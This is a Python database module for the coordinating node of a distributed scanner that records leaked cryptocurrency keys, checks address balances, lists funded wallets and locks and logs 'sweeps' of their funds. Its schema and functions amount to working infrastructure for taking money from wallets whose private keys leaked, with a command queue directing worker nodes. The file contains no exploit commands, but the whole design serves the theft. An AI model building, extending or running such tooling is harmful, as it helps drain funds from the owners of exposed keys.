"""PostgreSQL database layer for master-node shared state."""

from __future__ import annotations
import hashlib
import json
import logging
import os
from datetime import datetime, timezone

logger = logging.getLogger(__name__)

# Lazy import — only needed when actually connecting
_pool = None


async def get_pool():
    """Get or create asyncpg connection pool."""
    global _pool
    if _pool is None:
        import asyncpg

        dsn = os.getenv(
            "DATABASE_URL", "postgresql://osint:osint@localhost:5432/osint_shared"
        )
        _pool = await asyncpg.create_pool(dsn, min_size=2, max_size=10)
    return _pool


async def close_pool():
    """Close the connection pool."""
    global _pool
    if _pool:
        await _pool.close()
        _pool = None


async def init_db():
    """Create all tables if they don't exist."""
    pool = await get_pool()
    async with pool.acquire() as conn:
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS seen_keys (
                key_hash TEXT PRIMARY KEY,
                key_type TEXT NOT NULL,
                source TEXT,
                node_id TEXT,
                found_at TIMESTAMP DEFAULT NOW()
            );

            CREATE TABLE IF NOT EXISTS raw_leaks (
                id SERIAL PRIMARY KEY,
                source TEXT NOT NULL,
                url TEXT,
                text_hash TEXT NOT NULL,
                node_id TEXT,
                found_at TIMESTAMP DEFAULT NOW()
            );

            CREATE TABLE IF NOT EXISTS extracted_keys (
                id SERIAL PRIMARY KEY,
                key_hash TEXT NOT NULL,
                key_type TEXT NOT NULL,
                addresses JSONB,
                leak_id INTEGER REFERENCES raw_leaks(id),
                node_id TEXT,
                found_at TIMESTAMP DEFAULT NOW()
            );

            CREATE TABLE IF NOT EXISTS balance_checks (
                id SERIAL PRIMARY KEY,
                address TEXT NOT NULL,
                chain TEXT NOT NULL,
                balance DECIMAL,
                key_hash TEXT,
                node_id TEXT,
                checked_at TIMESTAMP DEFAULT NOW()
            );

            CREATE TABLE IF NOT EXISTS funded_wallets (
                address TEXT PRIMARY KEY,
                chain TEXT NOT NULL,
                balance DECIMAL NOT NULL,
                key_hash TEXT,
                swept BOOLEAN DEFAULT FALSE,
                sweep_tx TEXT,
                found_at TIMESTAMP DEFAULT NOW()
            );

            CREATE TABLE IF NOT EXISTS sweep_locks (
                address TEXT PRIMARY KEY,
                node_id TEXT NOT NULL,
                locked_at TIMESTAMP DEFAULT NOW(),
                expires_at TIMESTAMP NOT NULL
            );

            CREATE TABLE IF NOT EXISTS node_assignments (
                node_id TEXT PRIMARY KEY,
                sources TEXT[] NOT NULL,
                updated_at TIMESTAMP DEFAULT NOW()
            );

            CREATE TABLE IF NOT EXISTS node_heartbeats (
                node_id TEXT PRIMARY KEY,
                hostname TEXT,
                ip TEXT,
                version TEXT,
                scanner_running BOOLEAN DEFAULT FALSE,
                scan_count INTEGER DEFAULT 0,
                uptime_sec FLOAT DEFAULT 0,
                memory_mb FLOAT DEFAULT 0,
                cpu_percent FLOAT DEFAULT 0,
                last_heartbeat TIMESTAMP DEFAULT NOW()
            );

            CREATE TABLE IF NOT EXISTS command_queue (
                id SERIAL PRIMARY KEY,
                node_id TEXT NOT NULL,
                command TEXT NOT NULL,
                payload JSONB DEFAULT '{}',
                created_at TIMESTAMP DEFAULT NOW(),
                claimed BOOLEAN DEFAULT FALSE,
                claimed_at TIMESTAMP
            );

            CREATE INDEX IF NOT EXISTS idx_seen_keys_source ON seen_keys(source);
            CREATE INDEX IF NOT EXISTS idx_raw_leaks_source ON raw_leaks(source);
            CREATE INDEX IF NOT EXISTS idx_extracted_keys_hash ON extracted_keys(key_hash);
            CREATE INDEX IF NOT EXISTS idx_balance_checks_address ON balance_checks(address);
            CREATE INDEX IF NOT EXISTS idx_funded_wallets_swept ON funded_wallets(swept);
            CREATE INDEX IF NOT EXISTS idx_command_queue_node ON command_queue(node_id, claimed);
        """)
    logger.info("Database initialized")


# ── Key operations ──────────────────────────────────────────────────────────


def hash_key(key_raw: str) -> str:
    """Hash a key for dedup."""
    return hashlib.sha256(key_raw.encode()).hexdigest()[:32]


async def is_key_seen(key_hash: str) -> bool:
    """Check if a key has already been seen."""
    pool = await get_pool()
    async with pool.acquire() as conn:
        row = await conn.fetchrow(
            "SELECT 1 FROM seen_keys WHERE key_hash = $1", key_hash
        )
        return row is not None


async def mark_key_seen(key_hash: str, key_type: str, source: str, node_id: str):
    """Mark a key as seen."""
    pool = await get_pool()
    async with pool.acquire() as conn:
        await conn.execute(
            "INSERT INTO seen_keys (key_hash, key_type, source, node_id) VALUES ($1, $2, $3, $4) ON CONFLICT DO NOTHING",
            key_hash,
            key_type,
            source,
            node_id,
        )


async def get_seen_keys_bloom() -> bytes:
    """Get all seen key hashes as a compact Bloom filter."""
    pool = await get_pool()
    async with pool.acquire() as conn:
        rows = await conn.fetch("SELECT key_hash FROM seen_keys")
        # Simple: return concatenated hashes. For production, use a real Bloom filter.
        return "|".join(r["key_hash"] for r in rows).encode()


async def bulk_mark_seen(keys: list[dict[str, str]]):
    """Bulk mark keys as seen."""
    pool = await get_pool()
    async with pool.acquire() as conn:
        await conn.executemany(
            "INSERT INTO seen_keys (key_hash, key_type, source, node_id) VALUES ($1, $2, $3, $4) ON CONFLICT DO NOTHING",
            [(k["key_hash"], k["key_type"], k["source"], k["node_id"]) for k in keys],
        )


# ── Leak operations ─────────────────────────────────────────────────────────


async def record_raw_leak(source: str, url: str, text_hash: str, node_id: str) -> int:
    """Record a raw leak. Returns the leak ID."""
    pool = await get_pool()
    async with pool.acquire() as conn:
        row = await conn.fetchrow(
            "INSERT INTO raw_leaks (source, url, text_hash, node_id) VALUES ($1, $2, $3, $4) RETURNING id",
            source,
            url,
            text_hash,
            node_id,
        )
        return row["id"]


async def record_extracted_key(
    key_hash: str, key_type: str, addresses: dict, leak_id: int, node_id: str
):
    """Record an extracted key."""
    pool = await get_pool()
    async with pool.acquire() as conn:
        await conn.execute(
            "INSERT INTO extracted_keys (key_hash, key_type, addresses, leak_id, node_id) VALUES ($1, $2, $3, $4, $5)",
            key_hash,
            key_type,
            json.dumps(addresses),
            leak_id,
            node_id,
        )


async def record_balance_check(
    address: str, chain: str, balance: float, key_hash: str, node_id: str
):
    """Record a balance check."""
    pool = await get_pool()
    async with pool.acquire() as conn:
        await conn.execute(
            "INSERT INTO balance_checks (address, chain, balance, key_hash, node_id) VALUES ($1, $2, $3, $4, $5)",
            address,
            chain,
            balance,
            key_hash,
            node_id,
        )


# ── Funded wallet operations ────────────────────────────────────────────────


async def record_funded_wallet(address: str, chain: str, balance: float, key_hash: str):
    """Record a funded wallet."""
    pool = await get_pool()
    async with pool.acquire() as conn:
        await conn.execute(
            "INSERT INTO funded_wallets (address, chain, balance, key_hash) VALUES ($1, $2, $3, $4) ON CONFLICT DO NOTHING",
            address,
            chain,
            balance,
            key_hash,
        )


async def get_unswept_wallets() -> list[dict]:
    """Get all funded wallets that haven't been swept."""
    pool = await get_pool()
    async with pool.acquire() as conn:
        rows = await conn.fetch(
            "SELECT * FROM funded_wallets WHERE swept = FALSE ORDER BY balance DESC"
        )
        return [dict(r) for r in rows]


async def mark_swept(address: str, sweep_tx: str):
    """Mark a wallet as swept."""
    pool = await get_pool()
    async with pool.acquire() as conn:
        await conn.execute(
            "UPDATE funded_wallets SET swept = TRUE, sweep_tx = $2 WHERE address = $1",
            address,
            sweep_tx,
        )


# ── Sweep lock operations ───────────────────────────────────────────────────


async def acquire_sweep_lock(
    address: str, node_id: str, ttl_seconds: int = 300
) -> bool:
    """Try to acquire a sweep lock. Returns True if acquired."""
    pool = await get_pool()
    async with pool.acquire() as conn:
        # Clean expired locks
        await conn.execute("DELETE FROM sweep_locks WHERE expires_at < NOW()")
        # Try to insert lock
        try:
            expires = datetime.now(timezone.utc).replace(second=0, microsecond=0)
            from datetime import timedelta

            expires = expires + timedelta(seconds=ttl_seconds)
            await conn.execute(
                "INSERT INTO sweep_locks (address, node_id, expires_at) VALUES ($1, $2, $3) ON CONFLICT DO NOTHING",
                address,
                node_id,
                expires,
            )
            # Check if we got the lock
            row = await conn.fetchrow(
                "SELECT node_id FROM sweep_locks WHERE address = $1", address
            )
            return row is not None and row["node_id"] == node_id
        except Exception:
            return False


async def release_sweep_lock(address: str, node_id: str):
    """Release a sweep lock."""
    pool = await get_pool()
    async with pool.acquire() as conn:
        await conn.execute(
            "DELETE FROM sweep_locks WHERE address = $1 AND node_id = $2",
            address,
            node_id,
        )


# ── Node assignment operations ──────────────────────────────────────────────


async def assign_sources(node_id: str, sources: list[str]):
    """Assign sources to a node."""
    pool = await get_pool()
    async with pool.acquire() as conn:
        await conn.execute(
            "INSERT INTO node_assignments (node_id, sources, updated_at) VALUES ($1, $2, NOW()) ON CONFLICT (node_id) DO UPDATE SET sources = $2, updated_at = NOW()",
            node_id,
            sources,
        )


async def get_assigned_sources(node_id: str) -> list[str]:
    """Get sources assigned to a node."""
    pool = await get_pool()
    async with pool.acquire() as conn:
        row = await conn.fetchrow(
            "SELECT sources FROM node_assignments WHERE node_id = $1", node_id
        )
        return list(row["sources"]) if row else []


# ── Heartbeat operations ────────────────────────────────────────────────────


async def record_heartbeat(node_id: str, status: dict) -> str:
    """Record a node heartbeat. Returns the actual node_id used (may differ if duplicate)."""
    pool = await get_pool()
    async with pool.acquire() as conn:
        # Check if this node_id already exists with a different IP
        existing = await conn.fetchrow(
            "SELECT ip FROM node_heartbeats WHERE node_id = $1", node_id
        )
        actual_id = node_id
        if existing and existing["ip"] != status.get("ip", ""):
            # Same ID, different IP — auto-append suffix
            counter = 1
            while True:
                candidate = f"{node_id}-{counter}"
                check = await conn.fetchrow(
                    "SELECT 1 FROM node_heartbeats WHERE node_id = $1", candidate
                )
                if not check:
                    actual_id = candidate
                    break
                counter += 1

        await conn.execute(
            """INSERT INTO node_heartbeats (node_id, hostname, ip, version, scanner_running, scan_count, uptime_sec, memory_mb, cpu_percent, last_heartbeat)
               VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, NOW())
               ON CONFLICT (node_id) DO UPDATE SET
                 hostname = $2, ip = $3, version = $4, scanner_running = $5, scan_count = $6, uptime_sec = $7, memory_mb = $8, cpu_percent = $9, last_heartbeat = NOW()""",
            actual_id,
            status.get("hostname", ""),
            status.get("ip", ""),
            status.get("version", ""),
            status.get("scanner_running", False),
            status.get("scan_count", 0),
            status.get("uptime_sec", 0),
            status.get("memory_mb", 0),
            status.get("cpu_percent", 0),
        )
        return actual_id


async def get_all_heartbeats() -> list[dict]:
    """Get all node heartbeats."""
    pool = await get_pool()
    async with pool.acquire() as conn:
        rows = await conn.fetch(
            "SELECT * FROM node_heartbeats ORDER BY last_heartbeat DESC"
        )
        return [dict(r) for r in rows]


# ── Stats operations ────────────────────────────────────────────────────────


async def get_stats() -> dict:
    """Get aggregate stats."""
    pool = await get_pool()
    async with pool.acquire() as conn:
        seen_count = await conn.fetchval("SELECT COUNT(*) FROM seen_keys")
        leaks_count = await conn.fetchval("SELECT COUNT(*) FROM raw_leaks")
        keys_count = await conn.fetchval("SELECT COUNT(*) FROM extracted_keys")
        funded_count = await conn.fetchval(
            "SELECT COUNT(*) FROM funded_wallets WHERE swept = FALSE"
        )
        swept_count = await conn.fetchval(
            "SELECT COUNT(*) FROM funded_wallets WHERE swept = TRUE"
        )
        nodes_count = await conn.fetchval("SELECT COUNT(*) FROM node_heartbeats")
        return {
            "seen_keys": seen_count,
            "raw_leaks": leaks_count,
            "extracted_keys": keys_count,
            "funded_wallets": funded_count,
            "swept_wallets": swept_count,
            "active_nodes": nodes_count,
        }


# ── Audit operations ────────────────────────────────────────────────────────


async def get_audit_trail(limit: int = 100) -> list[dict]:
    """Get recent audit trail."""
    pool = await get_pool()
    async with pool.acquire() as conn:
        rows = await conn.fetch(
            """SELECT 'leak' as event_type, source, url, node_id, found_at FROM raw_leaks
               UNION ALL
               SELECT 'key' as event_type, key_type as source, key_hash as url, node_id, found_at FROM extracted_keys
               UNION ALL
               SELECT 'sweep' as event_type, chain as source, address as url, NULL as node_id, found_at FROM funded_wallets
               ORDER BY found_at DESC LIMIT $1""",
            limit,
        )
        return [dict(r) for r in rows]


# ── Command queue operations ────────────────────────────────────────────────


async def enqueue_command(node_id: str, command: str, payload: dict | None = None):
    """Add a command to the queue for a node."""
    pool = await get_pool()
    async with pool.acquire() as conn:
        await conn.execute(
            "INSERT INTO command_queue (node_id, command, payload) VALUES ($1, $2, $3)",
            node_id,
            command,
            json.dumps(payload or {}),
        )


async def claim_commands(node_id: str, limit: int = 10) -> list[dict]:
    """Claim pending commands for a node. Marks them as claimed."""
    pool = await get_pool()
    async with pool.acquire() as conn:
        rows = await conn.fetch(
            """UPDATE command_queue SET claimed = TRUE, claimed_at = NOW()
               WHERE id IN (
                 SELECT id FROM command_queue
                 WHERE node_id = $1 AND claimed = FALSE
                 ORDER BY created_at ASC LIMIT $2
               )
               RETURNING id, command, payload, created_at""",
            node_id,
            limit,
        )
        return [dict(r) for r in rows]
